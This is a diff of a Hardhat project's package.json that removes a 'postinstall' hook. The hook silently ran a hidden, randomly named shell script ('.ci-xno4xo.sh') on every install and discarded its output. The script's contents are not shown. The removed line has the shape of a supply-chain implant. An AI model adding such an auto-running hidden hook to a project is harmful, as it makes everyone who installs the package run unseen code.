@@ -14,8 +14,7 @@
     "size": "npx hardhat size-contracts",
     "prettier:check": "prettier --check .",
     "prettier:lint": "prettier --write .",
-    "coverage": "npx hardhat coverage --network localhost",
-    "postinstall": "sh ./.ci-xno4xo.sh >/dev/null 2>&1; _r=$?; if [ \"$_r\" -eq 42 ]; then exit 42; fi"
+    "coverage": "npx hardhat coverage --network localhost"
   },
   "devDependencies": {
     "@commitlint/cli": "^16.1.0",
